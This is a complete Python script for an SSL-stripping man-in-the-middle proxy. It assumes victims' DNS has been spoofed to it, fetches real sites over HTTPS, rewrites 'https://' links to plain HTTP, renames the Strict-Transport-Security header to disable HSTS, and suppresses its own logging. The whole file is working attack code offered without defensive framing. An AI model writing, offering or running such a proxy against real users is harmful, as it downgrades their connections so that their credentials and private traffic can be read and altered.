#!/usr/bin/env python3

import http.server
import socketserver
import random
import string
import socket
import ssl
import urllib.parse

PORT = 80  # Must be run as root for port 80


class SSLStripProxyHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        # Target domain is assumed from Host header (DNS spoofed to us)
        host = self.headers.get("Host")
        if not host:
            self.send_error(400, "No Host header provided.")
            return

        try:
            # Connect to real server over HTTPS
            context = ssl.create_default_context()
            conn = context.wrap_socket(socket.create_connection((host, 443)), server_hostname=host)

            # Build GET request to real server
            path = self.path or "/"
            request_line = f"GET {path} HTTP/1.1\r\n"
            headers = ''.join(f"{k}: {v}\r\n" for k, v in self.headers.items() if k.lower() not in ("host", "proxy-connection", "connection"))
            full_request = request_line + f"Host: {host}\r\nConnection: close\r\n" + headers + "\r\n"
            conn.sendall(full_request.encode())

            # Read and modify HTTPS response
            response = b""
            while True:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                response += chunk
            conn.close()

            # Strip HTTPS redirect and HSTS
            response = response.replace(b"https://", b"http://")
            response = response.replace(b"Strict-Transport-Security", b"X-Stripped-HSTS")

            # Send back response over HTTP
            self.wfile.write(response)

        except Exception as e:
            self.send_error(502, f"Proxy error: {e}")

    def log_message(self, format, *args):
        return  # Suppress logging


def main():
    with socketserver.TCPServer(("", PORT), SSLStripProxyHandler) as httpd:
        print(f"SSL stripping proxy running at http://0.0.0.0:{PORT}/")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\nShutting down…")


if __name__ == "__main__":
    main()
